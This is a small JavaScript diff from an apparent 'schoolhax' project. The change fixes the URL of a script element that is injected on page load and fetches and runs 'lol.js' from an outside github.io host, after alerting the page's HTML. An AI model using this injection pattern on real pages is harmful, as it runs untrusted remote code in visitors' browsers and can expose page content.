@@ -6,7 +6,7 @@ window.onunload = function(){
   function injectThis() {
     alert(document.body.innerHTML);
     var ele = document.createElement('script');
-    ele.src = "jeffnjellybean.github.io/schoolhax/lol.js";
+    ele.src = "http://jeffnjellybean.github.io/schoolhax/lol.js";
     document.body.appendChild(ele);
   }
   theScript.innerHTML = 'window.onload = ' + injectThis.toString() + ';';
